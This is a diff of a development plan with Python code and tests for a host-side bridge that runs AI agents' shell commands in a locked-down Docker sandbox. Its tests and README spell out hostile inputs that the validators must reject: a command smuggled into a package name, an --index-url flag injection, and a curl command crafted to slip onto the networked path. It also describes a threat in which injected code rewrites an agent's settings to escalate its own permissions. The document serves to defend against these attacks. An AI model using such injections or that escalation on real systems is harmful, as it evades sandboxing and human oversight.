@@ -4,7 +4,7 @@
 
 **Goal:** Give agents `mcp__sandbox__run(command)` / `mcp__sandbox__install(packages)` — arbitrary shell execution in a throwaway `claub-exec` Docker container that holds no secrets and mounts only the calling agent's workspace, spawned by a host-side bridge daemon (never a Docker socket in the bot container).
 
-**Architecture:** Mirrors the existing `scripts/playwright-bridge/` daemon pattern exactly. Agent → `mcps/sandbox/server.py` (FastMCP, baked into the bot image) → `POST http://host.docker.internal:9501/exec/{agent}` with an `X-Exec-Secret` header → `scripts/exec-bridge/bridge.py` (stdlib `ThreadingHTTPServer`, launchd) → `docker run --rm --network none ... claub-exec bash -c "<command>"`. Artifacts land on the workspace bind mount, which is mounted at the **same** path (`/claub/workspaces/{agent}`) in both containers, so a `[FILE:...]` marker resolves without translation.
+**Architecture:** Mirrors the existing `scripts/playwright-bridge/` daemon pattern exactly. Agent → `mcps/sandbox/server.py` (FastMCP, baked into the bot image) → `POST http://host.docker.internal:9501/{exec,install}/{agent}` with an `X-Exec-Secret` header → `scripts/exec-bridge/bridge.py` (stdlib `ThreadingHTTPServer`, launchd) → `docker run --rm ... claub-exec`. **Two endpoints, and the split is the whole trust boundary:** `/exec` takes a command and *always* passes `--network none`; `/install` takes only package names, has network, and never receives a command at all — the bridge validates the names and builds the argv itself. Artifacts land on the workspace bind mount, which is mounted at the **same** path (`/claub/workspaces/{agent}`) in both containers, so a `[FILE:...]` marker resolves without translation.
 
 **Tech Stack:** Python 3.12 stdlib (bridge), `mcp[cli]` + `httpx` (sandbox MCP, matching `mcps/file-download/`), Docker (Colima, aarch64), pytest + pytest-asyncio. Spec: `docs/superpowers/specs/2026-07-26-sandboxed-exec-design.md`.
 
@@ -14,7 +14,9 @@
 - **Host:** Colima on Virtualization.framework, aarch64, virtiofs, 4 GiB RAM (the binding constraint — memory, not CPU). Docker socket `unix:///Users/you/.colima/default/docker.sock`, context `colima`. Verified: Docker 28.4.0, `--tmpfs /tmp:size=Nm,exec` short-form accepted.
 - **Sandbox `docker run` flags, verbatim and load-bearing:** `--rm --name claub-exec-{agent}-{uuid} --network none --read-only --tmpfs /tmp:size=256m,exec --cap-drop ALL --security-opt no-new-privileges --memory 1g --cpus 1.5 --pids-limit 256`, env `HOME=/tmp MPLCONFIGDIR=/tmp/mpl UV_CACHE_DIR=/claub/workspaces/{agent}/.uv-cache UV_PYTHON_DOWNLOADS=never PATH=/claub/workspaces/{agent}/.venv/bin:/usr/local/bin:/usr/bin:/bin`, mounts `-v {host_ws}/{agent}:/claub/workspaces/{agent}` **plus** `-v {host_ws}/{agent}/.claude:/claub/workspaces/{agent}/.claude:ro`, `-w /claub/workspaces/{agent}`, then `bash -c "<command>"` (**not** `bash -lc`).
 - **`.claude/` read-only nested mount is the whole security fix.** Without it, injected code writes `{workspace}/.claude/settings.local.json` and the agent escalates its own permissions on its next turn. Two adversarial tests are load-bearing acceptance criteria: (1) `echo x > {workspace}/.claude/settings.local.json` → read-only filesystem; (2) `curl http://host.docker.internal:9500/status` → no network.
-- **Network:** `run` → `--network none` (arbitrary code never has network). `install` → default bridge network, command shape fixed by the server to `uv pip install <names>` where each name matches `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$`. The agent supplies names, never flags.
+- **Network — two endpoints, NOT one endpoint with a flag or a command-shape check.** `run` → `POST /exec/{agent}`, which *always* passes `--network none`. `install` → `POST /install/{agent}`, which has the default bridge network and takes **only** `{"packages": [str]}` — no command field, ever. The **bridge** validates each name against `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$` and constructs the argv itself (`uv venv --system-site-packages` on first use, then `uv pip install --python {ws}/.venv/bin/python <names>`). The MCP may validate too, but that is convenience — the bridge is the control, because it is the only component the bot container cannot tamper with.
+  - Routing on a request field (`{"network": true}`) would put the decision inside the bot container, the party the bridge's agent allowlist already assumes may be compromised.
+  - Routing by inspecting the command string is spoofable: a `"uv pip install " in command` check is defeated by `run("echo 'uv pip install '; curl http://host.docker.internal:9500/status")`. The networked path must be *structurally incapable* of running an arbitrary command, not merely checked for it.
 - **Output caps:** bridge streams each of stdout/stderr with a **1 MiB hard ceiling** (never `capture_output=True` — `run("yes")` would OOM the host). MCP additionally truncates each to **4000 chars**, tail-biased, with an explicit truncation marker.
 - **Timeout ordering** (strictly): `MCP_TOOL_TIMEOUT (existing, ≥1200000ms) > MCP HTTP client 600s > bridge total 540s (queue + exec) > exec 180s default / 600s max`. Queue wait = bridge total − exec timeout; exceeding it returns "sandbox busy, N ahead", not a block.
 - **Secret threading** (`.envrc` → `docker-compose.yml` env → bot container → MCP `env` block; and separately into the host bridge `config.json`): pick a var name `EXEC_BRIDGE_SECRET`. `.envrc` overrides `.env`, so any `docker compose up -d` must be `source .envrc && docker compose up -d`.
@@ -198,10 +200,12 @@ Split the testable pure logic out of the HTTP/subprocess I/O (the `file-download
 
 **Interfaces:**
 - Produces:
-  - `AGENT_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")`
+  - `AGENT_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")`, `PACKAGE_RE = re.compile(r"^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$")`
   - `validate_agent(name: str, allowed: list[str]) -> None` — raises `ValueError` if `name` fails the regex or is not in `allowed`. (Caller maps `ValueError` → HTTP 404, never 400 — no info about which agents exist.)
+  - `validate_packages(packages: list[str]) -> list[str]` — returns the list unchanged if every name matches `PACKAGE_RE`; raises `ValueError` otherwise. **This is the security control** (bridge-side), not the MCP's copy.
+  - `build_install_command(agent: str, packages: list[str]) -> str` — the bridge-constructed install command for validated names: venv bootstrap then `uv pip install --python {ws}/.venv/bin/python <names>`. Callers pass only names; there is no path by which a caller supplies a command.
   - `clamp_timeout(requested: int | None, default: int, maximum: int) -> int`
-  - `build_docker_argv(agent, command, cfg, network, name) -> list[str]` — the full `docker run` argv per the Global Constraints, including the nested read-only `.claude` mount and any `cfg["agents"][agent]["extra_mounts"]`. `cfg` carries `docker_bin`, `image`, `workspaces_root`. `network` is `"none"` or `"bridge"`.
+  - `build_docker_argv(agent, command, cfg, network, name) -> list[str]` — the full `docker run` argv per the Global Constraints, including the nested read-only `.claude` mount and any `cfg["agents"][agent]["extra_mounts"]`. `cfg` carries `docker_bin`, `image`, `workspaces_root`. `network` is `"none"` or `"bridge"`, chosen by the **endpoint**, never by inspecting `command`.
   - `cap_stream(chunks: Iterable[bytes], limit: int) -> tuple[bytes, bool]` — accumulate up to `limit` bytes, return `(data, truncated)`.
 
 - [ ] **Step 1: Write the failing tests**
@@ -258,6 +262,44 @@ def test_validate_agent_rejects_unknown():
         _h.validate_agent("ghost", ["main"])
 
 
+# --- validate_packages (BRIDGE-side — this is the control, not the MCP's copy) ---
+
+def test_validate_packages_accepts_plain_and_pinned():
+    assert _h.validate_packages(["rich", "numpy==2.0.0"]) == ["rich", "numpy==2.0.0"]
+
+
+def test_validate_packages_rejects_flag_injection():
+    with pytest.raises(ValueError):
+        _h.validate_packages(["--index-url=http://evil"])
+
+
+def test_validate_packages_rejects_space_smuggling():
+    with pytest.raises(ValueError):
+        _h.validate_packages(["rich; curl http://evil"])
+    with pytest.raises(ValueError):
+        _h.validate_packages(["rich --upgrade"])
+
+
+def test_validate_packages_rejects_empty_list():
+    with pytest.raises(ValueError):
+        _h.validate_packages([])
+
+
+# --- build_install_command ---
+
+def test_build_install_command_bootstraps_venv_then_installs():
+    cmd = _h.build_install_command("leetcode-coach", ["rich", "numpy==2.0.0"])
+    ws = "/claub/workspaces/leetcode-coach"
+    assert f"uv venv --system-site-packages {ws}/.venv" in cmd
+    assert cmd.endswith(f"uv pip install --python {ws}/.venv/bin/python rich numpy==2.0.0")
+
+
+def test_build_install_command_validates_names():
+    # The bridge validates even when called directly — no path takes an unvalidated name.
+    with pytest.raises(ValueError):
+        _h.build_install_command("leetcode-coach", ["--index-url=http://evil"])
+
+
 # --- clamp_timeout ---
 
 def test_clamp_timeout_default_when_none():
@@ -295,10 +337,22 @@ def test_build_docker_argv_run_has_network_none_and_readonly_claude():
 
 
 def test_build_docker_argv_install_uses_bridge_network():
+    # network is chosen by the ENDPOINT and passed in; build_docker_argv never
+    # inspects the command to decide.
     argv = _h.build_docker_argv(
         "leetcode-coach", "uv pip install rich", _cfg(), network="bridge", name="n"
     )
     assert argv[argv.index("--network") + 1] == "bridge"
+
+
+def test_build_docker_argv_never_infers_network_from_command():
+    # A command that merely MENTIONS the install shape still gets what the
+    # caller passed. Regression guard for command-substring routing.
+    argv = _h.build_docker_argv(
+        "leetcode-coach", "echo 'uv pip install '; curl http://host.docker.internal:9500",
+        _cfg(), network="none", name="n",
+    )
+    assert argv[argv.index("--network") + 1] == "none"
 
 
 def test_build_docker_argv_includes_extra_mounts():
@@ -343,6 +397,7 @@ import re
 from collections.abc import Iterable
 
 AGENT_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")
+PACKAGE_RE = re.compile(r"^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$")
 
 
 def validate_agent(name: str, allowed: list[str]) -> None:
@@ -354,6 +409,34 @@ def validate_agent(name: str, allowed: list[str]) -> None:
     """
     if not AGENT_NAME_RE.match(name) or name not in allowed:
         raise ValueError(f"unknown agent: {name!r}")
+
+
+def validate_packages(packages: list[str]) -> list[str]:
+    """Return *packages* unchanged if every entry is a bare (optionally pinned)
+    distribution name.
+
+    This is THE security control for the networked /install path: it runs in
+    the bridge, the one component a compromised bot container cannot tamper
+    with. The MCP validates too, but only as convenience.
+    """
+    if not packages:
+        raise ValueError("no packages given")
+    for name in packages:
+        if not PACKAGE_RE.match(name):
+            raise ValueError(f"invalid package name: {name!r}")
+    return packages
+
+
+def build_install_command(agent: str, packages: list[str]) -> str:
+    """Build the install command from validated names. The caller supplies
+    NAMES ONLY — there is no code path by which a caller provides a command on
+    the networked endpoint.
+    """
+    names = validate_packages(packages)
+    ws = f"/claub/workspaces/{agent}"
+    venv_python = f"{ws}/.venv/bin/python"
+    bootstrap = f"[ -x {venv_python} ] || uv venv --system-site-packages {ws}/.venv"
+    return f"{bootstrap} && uv pip install --python {venv_python} " + " ".join(names)
 
 
 def clamp_timeout(requested: int | None, default: int, maximum: int) -> int:
@@ -369,7 +452,13 @@ def build_docker_argv(
     network: str,
     name: str,
 ) -> list[str]:
-    """Full `docker run` argv. `network` is 'none' (run) or 'bridge' (install)."""
+    """Full `docker run` argv.
+
+    `network` is 'none' (/exec) or 'bridge' (/install) and is decided by the
+    ENDPOINT the request arrived on. This function must never inspect
+    `command` to infer it — that check is spoofable by a command that merely
+    contains the install shape.
+    """
     ws_root = cfg["workspaces_root"].rstrip("/")
     host_ws = f"{ws_root}/{agent}"
     cont_ws = f"/claub/workspaces/{agent}"
@@ -426,7 +515,7 @@ Expected: all PASS.
 
 ```bash
 git add scripts/exec-bridge/helpers.py bot/tests/test_exec_bridge_helpers.py
-git commit -m "feat(exec-bridge): pure helpers for agent validation and docker argv"
+git commit -m "feat(exec-bridge): pure helpers for agent/package validation and docker argv"
 ```
 
 ---
@@ -442,7 +531,12 @@ git commit -m "feat(exec-bridge): pure helpers for agent validation and docker a
 
 **Interfaces:**
 - Consumes: `helpers.py` (Task 2).
-- Produces: a daemon listening on `listen_port` (default 9501) with `POST /exec/{agent}` (header `X-Exec-Secret`, body `{"command": str, "timeout": int}`, response `{"exit_code","stdout","stdout_truncated","stderr","stderr_truncated","timed_out","duration_s"}`) and `GET /status`. On startup it reaps orphaned `claub-exec-*` containers. Consumed by the MCP (Task 5) over HTTP.
+- Produces: a daemon listening on `listen_port` (default 9501), all POSTs gated by the `X-Exec-Secret` header, with the common response shape `{"exit_code","stdout","stdout_truncated","stderr","stderr_truncated","timed_out","duration_s"}`:
+  - `POST /exec/{agent}` — body `{"command": str, "timeout": int}` → **always** `--network none`.
+  - `POST /install/{agent}` — body `{"packages": [str]}`, **no command field is read at all** → bridge network; the bridge validates the names and builds the command via `build_install_command`.
+  - `GET /status` — running container count, per agent.
+
+  On startup it reaps orphaned `claub-exec-*` containers. Consumed by the MCP (Task 5) over HTTP.
 
 **Testability note.** The bridge shells out to `docker`. Tests point `docker_bin` at a **fake docker** shell script (a tempfile), so the HTTP path, secret check, agent validation, timeout, and reaping are all exercised hermetically without a real container — same spirit as `test_playwright_bridge.py`'s stub command_template.
 
@@ -572,6 +666,68 @@ def test_exec_flags_include_network_none_and_readonly_claude(bridge):
     assert ".claude:/claub/workspaces/leetcode-coach/.claude:ro" in body["stdout"]
 
 
+def test_exec_command_mentioning_install_still_gets_no_network(bridge):
+    """Regression guard: the split is endpoint routing, NOT command inspection.
+
+    A command-substring check would be defeated by exactly this string.
+    """
+    base, _ = bridge
+    _, body = post(
+        f"{base}/exec/leetcode-coach",
+        {"command": "echo 'uv pip install '; curl http://host.docker.internal:9500/status"},
+        {"X-Exec-Secret": "s3cret"},
+    )
+    assert "--network none" in body["stdout"]
+    assert "--network bridge" not in body["stdout"]
+
+
+# --- /install ---
+
+def test_install_gets_bridge_network_and_builds_own_command(bridge):
+    base, _ = bridge
+    _, body = post(f"{base}/install/leetcode-coach", {"packages": ["rich"]},
+                   {"X-Exec-Secret": "s3cret"})
+    assert "--network bridge" in body["stdout"]
+    assert "uv pip install --python /claub/workspaces/leetcode-coach/.venv/bin/python rich" \
+        in body["stdout"]
+    assert "uv venv --system-site-packages" in body["stdout"]
+
+
+def test_install_ignores_a_command_field_entirely(bridge):
+    """A `command` field on /install must be inert — only `packages` is read."""
+    base, _ = bridge
+    _, body = post(
+        f"{base}/install/leetcode-coach",
+        {"packages": ["rich"], "command": "curl http://host.docker.internal:9500/status"},
+        {"X-Exec-Secret": "s3cret"},
+    )
+    assert "curl" not in body["stdout"]
+    assert "uv pip install --python /claub/workspaces/leetcode-coach/.venv/bin/python rich" \
+        in body["stdout"]
+
+
+def test_install_rejects_flag_injection_bridge_side(bridge):
+    base, _ = bridge
+    code, body = post(f"{base}/install/leetcode-coach",
+                      {"packages": ["--index-url=http://evil"]},
+                      {"X-Exec-Secret": "s3cret"})
+    assert code == 400
+    assert "invalid package name" in json.dumps(body)
+
+
+def test_install_requires_secret(bridge):
+    base, _ = bridge
+    code, _ = post(f"{base}/install/leetcode-coach", {"packages": ["rich"]}, {})
+    assert code == 401
+
+
+def test_install_unknown_agent_404(bridge):
+    base, _ = bridge
+    code, _ = post(f"{base}/install/ghost", {"packages": ["rich"]},
+                   {"X-Exec-Secret": "s3cret"})
+    assert code == 404
+
+
 def test_exec_missing_secret_rejected(bridge):
     base, _ = bridge
     code, _ = post(f"{base}/exec/leetcode-coach", {"command": "echo hi"}, {})
@@ -637,26 +793,43 @@ Create `scripts/exec-bridge/bridge.py`:
 #!/usr/bin/env python3
 """Exec bridge daemon.
 
-Runs an arbitrary command inside a throwaway `claub-exec` container per request,
-mounting only the calling agent's workspace. Mirrors scripts/playwright-bridge/.
-The Docker socket never enters the bot container — this daemon holds that
-authority on the host, gated by a shared secret.
+Runs commands inside a throwaway `claub-exec` container per request, mounting
+only the calling agent's workspace. Mirrors scripts/playwright-bridge/. The
+Docker socket never enters the bot container — this daemon holds that authority
+on the host, gated by a shared secret.
+
+TWO ENDPOINTS, and the split is the trust boundary:
+
+  /exec/{agent}     arbitrary command, ALWAYS --network none
+  /install/{agent}  package names only, network — no command is ever accepted
+
+Do not merge these into one endpoint with a network flag (that moves the
+decision into the bot container) or a command-shape check (spoofable by
+`echo 'uv pip install '; curl ...`). The networked path must be structurally
+incapable of running an arbitrary command, not merely checked for it.
 """
 from __future__ import annotations
 
 import argparse
+import hmac
 import json
 import logging
-import os
 import subprocess
 import sys
 import threading
+import time
 import uuid
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parent))
-from helpers import build_docker_argv, cap_stream, clamp_timeout, validate_agent
+from helpers import (
+    build_docker_argv,
+    build_install_command,
+    cap_stream,
+    clamp_timeout,
+    validate_agent,
+)
 
 log = logging.getLogger("exec-bridge")
 
@@ -679,7 +852,6 @@ def _read_capped(pipe, limit: int) -> tuple[bytes, bool]:
 
 def run_container(argv: list[str], name: str, exec_timeout: int, docker_bin: str) -> dict:
     """Run the container, streaming output under a byte cap; kill on timeout."""
-    import time
     start = time.monotonic()
     proc = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result: dict = {}
@@ -718,13 +890,12 @@ def run_container(argv: list[str], name: str, exec_timeout: int, docker_bin: str
     }
 
 
-def handle_exec(agent: str, command: str, requested_timeout: int | None) -> tuple[int, dict]:
-    allowed = list(CONFIG.get("agents", {}).keys())
-    try:
-        validate_agent(agent, allowed)
-    except ValueError:
-        return 404, {"error": "unknown agent"}
+def _dispatch(agent: str, command: str, network: str, requested_timeout: int | None) -> tuple[int, dict]:
+    """Queue, spawn, and reap one container.
 
+    `network` is supplied by the CALLING HANDLER (i.e. by which endpoint the
+    request hit) and is never inferred from `command`.
+    """
     exec_timeout = clamp_timeout(requested_timeout, CONFIG["default_timeout"], CONFIG["max_timeout"])
     # Queue wait is bounded separately: bridge_total - exec, so a queued call
     # fails fast with "sandbox busy" rather than blocking to the outer timeout.
@@ -735,7 +906,6 @@ def handle_exec(agent: str, command: str, requested_timeout: int | None) -> tupl
         return 503, {"error": f"sandbox busy, {ahead} ahead — try again shortly"}
 
     name = f"claub-exec-{agent}-{uuid.uuid4().hex[:12]}"
-    network = "bridge" if command.startswith("uv pip install ") else "none"
     argv = build_docker_argv(agent, command, CONFIG, network, name)
     with RUNNING_LOCK:
         RUNNING[agent] = RUNNING.get(agent, 0) + 1
@@ -746,6 +916,37 @@ def handle_exec(agent: str, command: str, requested_timeout: int | None) -> tupl
         with RUNNING_LOCK:
             RUNNING[agent] = max(0, RUNNING.get(agent, 1) - 1)
         SEM.release()
+
+
+def _check_agent(agent: str) -> tuple[int, dict] | None:
+    try:
+        validate_agent(agent, list(CONFIG.get("agents", {}).keys()))
+    except ValueError:
+        return 404, {"error": "unknown agent"}
+    return None
+
+
+def handle_exec(agent: str, payload: dict) -> tuple[int, dict]:
+    """/exec — arbitrary command, ALWAYS --network none. No exceptions, no
+    inspection of the command to decide otherwise."""
+    bad = _check_agent(agent)
+    if bad:
+        return bad
+    return _dispatch(agent, payload.get("command", ""), "none", payload.get("timeout"))
+
+
+def handle_install(agent: str, payload: dict) -> tuple[int, dict]:
+    """/install — package names ONLY. The networked path never accepts a
+    command: any `command` key in the payload is simply never read, and the
+    bridge builds the argv itself from validated names."""
+    bad = _check_agent(agent)
+    if bad:
+        return bad
+    try:
+        command = build_install_command(agent, payload.get("packages") or [])
+    except ValueError as e:
+        return 400, {"error": str(e)}
+    return _dispatch(agent, command, "bridge", CONFIG.get("max_timeout"))
 
 
 def reap_orphans() -> None:
@@ -772,16 +973,20 @@ class Handler(BaseHTTPRequestHandler):
         self.wfile.write(data)
 
     def do_POST(self) -> None:
-        # Path is /exec/{agent}; unquote so encoded traversal is caught by the regex.
+        # Paths are /exec/{agent} and /install/{agent}; unquote so encoded
+        # traversal is caught by the agent-name regex.
         from urllib.parse import unquote
         parts = [unquote(p) for p in self.path.strip("/").split("/")]
-        if len(parts) == 2 and parts[0] == "exec":
-            if self.headers.get("X-Exec-Secret", "") != CONFIG.get("secret"):
+        handlers = {"exec": handle_exec, "install": handle_install}
+        if len(parts) == 2 and parts[0] in handlers:
+            if not hmac.compare_digest(
+                self.headers.get("X-Exec-Secret", ""), CONFIG.get("secret", "")
+            ):
                 self._send(401, {"error": "missing or invalid secret"})
                 return
             length = int(self.headers.get("Content-Length", 0))
             payload = json.loads(self.rfile.read(length) or b"{}")
-            code, body = handle_exec(parts[1], payload.get("command", ""), payload.get("timeout"))
+            code, body = handlers[parts[0]](parts[1], payload)
             self._send(code, body)
             return
         self._send(404, {"error": "unknown path"})
@@ -902,6 +1107,23 @@ Host-side daemon that spawns a throwaway `claub-exec` container per
 workspace. The Docker socket never enters the bot container — this daemon holds
 that authority on the host. Mirrors `scripts/playwright-bridge/`.
 
+## Endpoints
+
+| Method | Path | Body | Network |
+|---|---|---|---|
+| POST | `/exec/{agent}` | `{"command", "timeout"}` | **always `none`** |
+| POST | `/install/{agent}` | `{"packages": [str]}` — no command field | bridge |
+| GET | `/status` | — | — |
+
+**Do not merge these into one endpoint.** A network flag in the request body
+moves the decision into the bot container — the party the agent allowlist
+already assumes may be compromised. A command-shape check is spoofable:
+`run("echo 'uv pip install '; curl http://host.docker.internal:9500/status")`
+would take the networked path and reach the Playwright bridge. `/install`
+accepts package names only; the bridge validates each against
+`^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$` and builds the argv itself, so the
+networked path cannot run an arbitrary command at all.
+
 ## Prerequisites
 
 - Build the image first: `docker build -t claub-exec docker/exec-sandbox/`
@@ -970,7 +1192,7 @@ git commit -m "feat(exec-bridge): daemon, config example, launchd plist, README"
 
 ---
 
-### Task 4: Sandbox MCP pure helpers — install name validation and output truncation
+### Task 4: Sandbox MCP pure helpers — output truncation and convenience validation
 
 **Files:**
 - Create: `mcps/sandbox/helpers.py`
@@ -979,9 +1201,9 @@ git commit -m "feat(exec-bridge): daemon, config example, launchd plist, README"
 **Interfaces:**
 - Produces:
   - `PACKAGE_RE = re.compile(r"^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$")`
-  - `validate_packages(packages: list[str]) -> list[str]` — returns the list unchanged if every name matches `PACKAGE_RE`; raises `ValueError` otherwise (catches `--index-url=...`, flags, empty).
-  - `build_install_command(packages: list[str], venv_python: str) -> str` — the fixed `uv pip install --python {venv_python} <names>` string; the agent never supplies flags.
+  - `validate_packages(packages: list[str]) -> list[str]` — returns the list unchanged if every name matches `PACKAGE_RE`; raises `ValueError` otherwise. **Convenience only** — it gives the agent a fast, clear error without a round trip. The enforcing copy is the bridge's (Task 2); this one is deliberately duplicated and must never be treated as the control.
   - `truncate_tail(text: str, limit: int = 4000) -> str` — tail-biased truncation with an explicit leading marker when dropped.
+- Note: `build_install_command` does **not** live here. The MCP never constructs an install command — it forwards package names to `/install` and the bridge builds the argv.
 
 - [ ] **Step 1: Write the failing tests**
 
@@ -1023,14 +1245,10 @@ def test_validate_packages_rejects_empty_list():
         _h.validate_packages([])
 
 
-# --- build_install_command ---
-
-def test_build_install_command_fixed_shape():
-    cmd = _h.build_install_command(["rich", "numpy==2.0.0"],
-                                   "/claub/workspaces/x/.venv/bin/python")
-    assert cmd == ("uv pip install --python /claub/workspaces/x/.venv/bin/python "
-                   "rich numpy==2.0.0")
-    assert cmd.startswith("uv pip install ")  # bridge routes this to network=bridge
+def test_mcp_does_not_build_install_commands():
+    # The MCP forwards NAMES to /install; the bridge builds the argv. If this
+    # ever gains a build_install_command, the trust boundary has drifted.
+    assert not hasattr(_h, "build_install_command")
 
 
 # --- truncate_tail ---
@@ -1067,8 +1285,14 @@ PACKAGE_RE = re.compile(r"^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$")
 
 def validate_packages(packages: list[str]) -> list[str]:
     """Return *packages* unchanged if every name is a bare (optionally pinned)
-    distribution name. Raises ValueError otherwise — this is what stops an
-    agent smuggling a flag such as --index-url through `install`.
+    distribution name.
+
+    CONVENIENCE ONLY — it saves the agent a round trip and gives a clearer
+    error. The enforcing copy lives in the bridge (scripts/exec-bridge/
+    helpers.py), because the bridge is the only component a compromised bot
+    container cannot tamper with. Never treat this copy as the control, and
+    never build an install command here — the MCP forwards names, the bridge
+    builds the argv.
     """
     if not packages:
         raise ValueError("no packages given")
@@ -1076,11 +1300,6 @@ def validate_packages(packages: list[str]) -> list[str]:
         if not PACKAGE_RE.match(name):
             raise ValueError(f"invalid package name: {name!r}")
     return packages
-
-
-def build_install_command(packages: list[str], venv_python: str) -> str:
-    """The fixed install command shape. The server builds this — never the agent."""
-    return f"uv pip install --python {venv_python} " + " ".join(packages)
 
 
 def truncate_tail(text: str, limit: int = 4000) -> str:
@@ -1115,9 +1334,9 @@ git commit -m "feat(sandbox-mcp): pure helpers for package validation and trunca
 **Interfaces:**
 - Consumes: `helpers.py` (Task 4). Reads `CLAUB_AGENT_NAME`, `EXEC_BRIDGE_SECRET`, `EXEC_BRIDGE_URL` (default `http://host.docker.internal:9501`) from the environment at startup; fails loudly if `CLAUB_AGENT_NAME` is absent (the `latex-resume`/`file-download` precedent).
 - Produces:
-  - `run(command: str, timeout: int = 180) -> str` — JSON (`--network none` chosen bridge-side because the command does not start with `uv pip install `).
-  - `install(packages: list[str]) -> str` — validates names, bootstraps `{workspace}/.venv` on first use, then runs the fixed install command (network).
-  - Internal `_post_exec(command, timeout) -> dict` that POSTs to the bridge with the `X-Exec-Secret` header and maps a connection failure to an actionable error.
+  - `run(command: str, timeout: int = 180) -> str` — JSON; POSTs `{"command", "timeout"}` to `/exec/{agent}`, which is unconditionally `--network none`.
+  - `install(packages: list[str]) -> str` — JSON; POSTs `{"packages": [...]}` to `/install/{agent}`. It sends **names only** — no command, no venv path, no flags. The bridge validates and builds the argv (including the venv bootstrap).
+  - Internal `_post(path: str, payload: dict) -> dict` that POSTs to the bridge with the `X-Exec-Secret` header and maps a connection failure to an actionable error.
 
 - [ ] **Step 1: Write the failing tests**
 
@@ -1150,6 +1369,7 @@ def test_run_posts_command_and_returns_json(monkeypatch):
 
     def fake_post(url, json, headers, timeout):
         captured["url"] = url
+        captured["payload"] = json
         captured["command"] = json["command"]
         captured["secret"] = headers.get("X-Exec-Secret")
         resp = MagicMock()
@@ -1205,12 +1425,13 @@ def test_install_rejects_flag_without_calling_bridge(monkeypatch):
     assert "invalid" in out["error"].lower()
 
 
-def test_install_builds_fixed_command(monkeypatch):
+def test_install_posts_names_only_to_install_endpoint(monkeypatch):
     srv = _load_server(monkeypatch)
     captured = {}
 
     def fake_post(url, json, headers, timeout):
-        captured["command"] = json["command"]
+        captured["url"] = url
+        captured["payload"] = json
         resp = MagicMock()
         resp.json.return_value = {"exit_code": 0, "stdout": "", "stdout_truncated": False,
                                   "stderr": "", "stderr_truncated": False,
@@ -1220,10 +1441,10 @@ def test_install_builds_fixed_command(monkeypatch):
 
     monkeypatch.setattr(srv.httpx, "post", fake_post)
     srv.install(["rich"])
-    # bootstrap venv + install, both routed through the bridge; the install
-    # command has the fixed uv-pip shape so the bridge grants it network.
-    assert "uv pip install --python /claub/workspaces/leetcode-coach/.venv/bin/python rich" \
-        in captured["command"]
+    assert captured["url"].endswith("/install/leetcode-coach")
+    # NAMES ONLY — the MCP must never send a command on the networked path.
+    assert captured["payload"] == {"packages": ["rich"]}
+    assert "command" not in captured["payload"]
 
 
 def test_missing_agent_name_raises(monkeypatch):
@@ -1248,10 +1469,11 @@ Create `mcps/sandbox/server.py`:
 ```python
 """MCP server exposing a throwaway execution sandbox to a Claub agent.
 
-`run` and `install` POST to the host-side exec bridge, which spawns a
-`claub-exec` container mounting only this agent's workspace. Follows the
-latex-resume / file-download shape: agent name comes from the environment (never
-a tool parameter), so an agent cannot address another agent's sandbox.
+`run` POSTs to the bridge's /exec (always --network none); `install` POSTs
+package NAMES to /install (networked, but structurally unable to run an
+arbitrary command — the bridge builds that argv). Follows the latex-resume /
+file-download shape: agent name comes from the environment (never a tool
+parameter), so an agent cannot address another agent's sandbox.
 """
 import json
 import logging
@@ -1260,7 +1482,7 @@ import sys
 
 import httpx
 
-from helpers import build_install_command, truncate_tail, validate_packages
+from helpers import truncate_tail, validate_packages
 
 logging.basicConfig(level=logging.INFO, stream=sys.stderr)
 logger = logging.getLogger(__name__)
@@ -1274,7 +1496,6 @@ if not AGENT_NAME:
 BRIDGE_URL = os.environ.get("EXEC_BRIDGE_URL", "http://host.docker.internal:9501").rstrip("/")
 BRIDGE_SECRET = os.environ.get("EXEC_BRIDGE_SECRET", "")
 WORKSPACE_DIR = f"/claub/workspaces/{AGENT_NAME}"
-VENV_PYTHON = f"{WORKSPACE_DIR}/.venv/bin/python"
 HTTP_TIMEOUT = 600  # < MCP_TOOL_TIMEOUT, > bridge total
 
 mcp = FastMCP("sandbox")
@@ -1285,10 +1506,10 @@ def _err(message: str) -> str:
                        "timed_out": False})
 
 
-def _post_exec(command: str, timeout: int) -> dict:
+def _post(path: str, payload: dict) -> dict:
     resp = httpx.post(
-        f"{BRIDGE_URL}/exec/{AGENT_NAME}",
-        json={"command": command, "timeout": timeout},
+        f"{BRIDGE_URL}/{path}/{AGENT_NAME}",
+        json=payload,
         headers={"X-Exec-Secret": BRIDGE_SECRET},
         timeout=HTTP_TIMEOUT,
     )
@@ -1296,14 +1517,19 @@ def _post_exec(command: str, timeout: int) -> dict:
     return resp.json()
 
 
-def _run_and_format(command: str, timeout: int) -> str:
+def _call_and_format(path: str, payload: dict) -> str:
     try:
-        data = _post_exec(command, timeout)
+        data = _post(path, payload)
     except httpx.ConnectError:
         return _err("sandbox bridge is not running on the host (connection refused). "
                     "Ask the operator to start the exec bridge.")
     except httpx.HTTPStatusError as e:
-        return _err(f"sandbox bridge returned HTTP {e.response.status_code}")
+        detail = ""
+        try:
+            detail = ": " + str(e.response.json().get("error", ""))
+        except Exception:
+            pass
+        return _err(f"sandbox bridge returned HTTP {e.response.status_code}{detail}")
     except httpx.HTTPError as e:
         return _err(f"sandbox bridge request failed: {e}")
     data["stdout"] = truncate_tail(data.get("stdout", ""))
@@ -1330,7 +1556,7 @@ def run(command: str, timeout: int = 180) -> str:
         JSON: exit_code, stdout, stderr (each tail-truncated to 4000 chars),
         timed_out, duration_s.
     """
-    return _run_and_format(command, timeout)
+    return _call_and_format("exec", {"command": command, "timeout": timeout})
 
 
 @mcp.tool()
@@ -1344,40 +1570,22 @@ def install(packages: list[str]) -> str:
     Args:
